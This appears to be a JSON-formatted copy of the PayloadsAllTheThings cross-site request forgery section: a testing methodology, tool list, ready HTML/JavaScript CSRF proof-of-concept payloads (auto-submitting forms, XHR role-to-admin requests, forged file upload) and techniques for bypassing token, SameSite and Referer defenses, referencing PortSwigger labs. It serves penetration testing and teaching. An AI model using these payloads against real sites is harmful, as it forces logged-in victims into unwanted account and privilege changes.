@@ -1,0 +1,167 @@
+{
+  "category": "Cross-Site Request Forgery",
+  "source": "PayloadsAllTheThings/Cross-Site Request Forgery/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "CSRF Cheat Sheet - decision tree (TrustFoundry)",
+      "language": "image",
+      "tags": ["methodology", "cheatsheet", "csrf"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/csrf/CSRF-CheatSheet.png",
+        "caption": "Flowchart for checking CSRF: does the application react to a cross-site request → is a CSRF token required → GET or POST → can you build a simple request (text/plain, x-www-form-urlencoded, multipart) or is a complex one needed (application/json). Branches lead to the appropriate PoC (GET/POST/JSON) or to the conclusion \"CSRF Not Possible\". Source: TrustFoundry / PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "What is CSRF",
+      "language": "text",
+      "tags": ["methodology", "concept"],
+      "body": "CSRF (Cross-Site Request Forgery) forces an authenticated user to perform an unwanted action in an application where they are already logged in. The attack targets state-changing requests rather than data theft - the attacker does not see the response to the forged request.\n\nWhen you are logged in, you have a session. Its identifier is stored in a browser cookie and is sent with every request to the site. Even if the request is initiated by a third-party site, the cookie still goes along with the request, and it is processed as if it were made by the logged-in user."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "How to test for CSRF",
+      "language": "text",
+      "tags": ["methodology", "how-to-test"],
+      "body": "• Look for state-changing requests: change of email/password/name, role change, funds transfer, adding privileges, deletion.\n• Check that the request has no anti-CSRF token (or that it is not validated). If a token exists - try bypasses: remove the token, empty token, another user's token, predictable token.\n• Determine the request type from the cheat sheet: GET / POST / JSON. Pick the minimal PoC.\n• For POST-JSON: try changing the Content-Type to text/plain or x-www-form-urlencoded - a \"simple\" request does not trigger preflight and often goes through.\n• Check the SameSite cookie (Lax/Strict/None) and Referer/Origin validation - these are the main defenses.\n• Generate a PoC, open it in a second session/incognito with a logged-in victim, and confirm that the action was performed."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "0xInfection/XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.\nBurp Suite → right-click the request → Engagement tools → Generate CSRF PoC."
+    },
+
+    {
+      "subcategory": "PoC templates",
+      "title": "HTML GET - with user action (click)",
+      "language": "html",
+      "tags": ["poc", "get"],
+      "body": "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>"
+    },
+    {
+      "subcategory": "PoC templates",
+      "title": "HTML GET - without user action (img)",
+      "language": "html",
+      "tags": ["poc", "get", "no-interaction"],
+      "body": "<img src=\"http://www.example.com/api/setusername?username=CSRFd\">"
+    },
+    {
+      "subcategory": "PoC templates",
+      "title": "HTML POST - with user action (click)",
+      "language": "html",
+      "tags": ["poc", "post"],
+      "body": "<form action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">\n <input name=\"username\" type=\"hidden\" value=\"CSRFd\" />\n <input type=\"submit\" value=\"Submit Request\" />\n</form>"
+    },
+    {
+      "subcategory": "PoC templates",
+      "title": "HTML POST - autosubmit, without user action",
+      "language": "html",
+      "tags": ["poc", "post", "autosubmit"],
+      "body": "<form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">\n <input name=\"username\" type=\"hidden\" value=\"CSRFd\" />\n <input type=\"submit\" value=\"Submit Request\" />\n</form>\n \n<script>\n document.getElementById(\"autosubmit\").submit();\n</script>"
+    },
+    {
+      "subcategory": "PoC templates",
+      "title": "HTML POST - multipart/form-data with file upload (click)",
+      "language": "html",
+      "tags": ["poc", "multipart", "file-upload"],
+      "body": "<script>\nfunction launch(){\n    const dT = new DataTransfer();\n    const file = new File( [ \"CSRF-filecontent\" ], \"CSRF-filename\" );\n    dT.items.add( file );\n    document.xss[0].files = dT.files;\n\n    document.xss.submit()\n}\n</script>\n\n<form style=\"display: none\" name=\"xss\" method=\"post\" action=\"<target>\" enctype=\"multipart/form-data\">\n<input id=\"file\" type=\"file\" name=\"file\"/>\n<input type=\"submit\" name=\"\" value=\"\" size=\"0\" />\n</form>\n<button value=\"button\" onclick=\"launch()\">Submit Request</button>"
+    },
+    {
+      "subcategory": "PoC templates",
+      "title": "JSON GET - simple request (XHR)",
+      "language": "html",
+      "tags": ["poc", "json", "get"],
+      "body": "<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"http://www.example.com/api/currentuser\");\nxhr.send();\n</script>"
+    },
+    {
+      "subcategory": "PoC templates",
+      "title": "JSON POST - simple request (XHR, text/plain)",
+      "language": "html",
+      "tags": ["poc", "json", "post"],
+      "body": "<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"http://www.example.com/api/setrole\");\n//application/json is not allowed in a simple request. text/plain is the default\nxhr.setRequestHeader(\"Content-Type\", \"text/plain\");\n//You will probably want to also try one or both of these\n//xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n//xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data\");\nxhr.send('{\"role\":admin}');\n</script>"
+    },
+    {
+      "subcategory": "PoC templates",
+      "title": "JSON POST - autosubmit form (bypassing browser defenses)",
+      "language": "html",
+      "tags": ["poc", "json", "autosubmit", "bypass"],
+      "body": "<form id=\"CSRF_POC\" action=\"www.example.com/api/setrole\" enctype=\"text/plain\" method=\"POST\">\n// this input will send : {\"role\":admin,\"other\":\"=\"}\n <input type=\"hidden\" name='{\"role\":admin, \"other\":\"'  value='\"}' />\n</form>\n<script>\n document.getElementById(\"CSRF_POC\").submit();\n</script>"
+    },
+    {
+      "subcategory": "PoC templates",
+      "title": "JSON POST - complex request (XHR, application/json)",
+      "language": "html",
+      "tags": ["poc", "json", "post"],
+      "body": "<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"http://www.example.com/api/setrole\");\nxhr.withCredentials = true;\nxhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");\nxhr.send('{\"role\":admin}');\n</script>"
+    },
+    {
+      "subcategory": "PoC templates",
+      "title": "Note on simple vs complex request",
+      "language": "text",
+      "tags": ["json", "preflight", "cors"],
+      "body": "application/json is not allowed in a \"simple\" request - the default is text/plain. A \"simple\" request (GET/POST/HEAD with Content-Type text/plain | x-www-form-urlencoded | multipart/form-data) does not trigger a CORS preflight and goes out with cookies → suitable for CSRF.\n\nA complex request (application/json;charset=UTF-8, etc.) triggers a preflight OPTIONS. It will work only if the server itself responds with permissive CORS headers. A form with enctype=\"text/plain\" can \"glue together\" valid JSON and bypass protections that require preflight (for example, the Standard mode of Enhanced Tracking Protection in Firefox)."
+    },
+
+    {
+      "subcategory": "Bypassing defenses (tokens / SameSite / Referer)",
+      "title": "No defense present",
+      "language": "text",
+      "tags": ["bypass", "no-token"],
+      "body": "The simplest case: there is no anti-CSRF token at all, Referer/Origin validation is absent, SameSite is not set. Any standard PoC (GET/POST/JSON) will work directly.\nLab: PortSwigger - CSRF vulnerability with no defenses."
+    },
+    {
+      "subcategory": "Bypassing defenses (tokens / SameSite / Referer)",
+      "title": "Token is validated only for one method",
+      "language": "text",
+      "tags": ["bypass", "method-override", "token"],
+      "body": "Sometimes the token is checked only for POST but not for GET (or vice versa). Change the request method: turn POST into GET (parameters in the query string) - token validation may fall away and you can skip sending it entirely.\nLab: PortSwigger - CSRF where token validation depends on request method."
+    },
+    {
+      "subcategory": "Bypassing defenses (tokens / SameSite / Referer)",
+      "title": "Token is checked only if present",
+      "language": "text",
+      "tags": ["bypass", "token", "empty-token"],
+      "body": "The server validates the token only when the parameter is sent. Remove the token parameter from the request entirely (not empty - but absent) - the check is skipped, and CSRF goes through.\nLab: PortSwigger - CSRF where token validation depends on token being present."
+    },
+    {
+      "subcategory": "Bypassing defenses (tokens / SameSite / Referer)",
+      "title": "Token is not tied to the user session",
+      "language": "text",
+      "tags": ["bypass", "token", "another-user"],
+      "body": "The token is valid but not tied to a specific session. Log in with your own account, obtain a valid token, and insert it into the PoC for the victim - the server will accept the \"foreign\" token.\nLab: PortSwigger - CSRF where token is not tied to user session."
+    },
+    {
+      "subcategory": "Bypassing defenses (tokens / SameSite / Referer)",
+      "title": "Token is tied to a non-session cookie",
+      "language": "text",
+      "tags": ["bypass", "token", "cookie"],
+      "body": "The token is checked against a separate (non-session) cookie. If there is a way to set your own cookie on the victim (for example, via header injection/a subdomain), set the cookie+token pair from yourself - the check will match.\nLab: PortSwigger - CSRF where token is tied to non-session cookie."
+    },
+    {
+      "subcategory": "Bypassing defenses (tokens / SameSite / Referer)",
+      "title": "Token is duplicated in a cookie (double-submit)",
+      "language": "text",
+      "tags": ["bypass", "token", "double-submit"],
+      "body": "The double-submit pattern: the server only checks that the token in the parameter equals the token in the cookie, without validating it itself. If you can set a cookie on the victim, set the same arbitrary value both in the cookie and in the form parameter - they will match.\nLab: PortSwigger - CSRF where token is duplicated in cookie."
+    },
+    {
+      "subcategory": "Bypassing defenses (tokens / SameSite / Referer)",
+      "title": "Referer is checked only when the header is present",
+      "language": "text",
+      "tags": ["bypass", "referer"],
+      "body": "The server validates the Referer only if it is sent. Suppress sending the Referer entirely, and the check is skipped:\n\n<meta name=\"referrer\" content=\"no-referrer\">\n\nor the rel=\"noreferrer\" attribute on the link/form.\nLab: PortSwigger - CSRF where Referer validation depends on header being present."
+    },
+    {
+      "subcategory": "Bypassing defenses (tokens / SameSite / Referer)",
+      "title": "Broken Referer validation",
+      "language": "text",
+      "tags": ["bypass", "referer"],
+      "body": "If the server checks only a substring (the domain appears somewhere in the Referer), bypass the naive check. Place the expected domain in your own URL - as a subdomain or as a parameter:\n\nhttp://attacker.com/?vulnerable-website.com\nhttp://vulnerable-website.com.attacker.com/\n\nTo get the full path/query into the Referer, relax the page policy:\n<meta name=\"referrer\" content=\"unsafe-url\">\nLab: PortSwigger - CSRF with broken Referer validation."
+    }
+  ]
+}
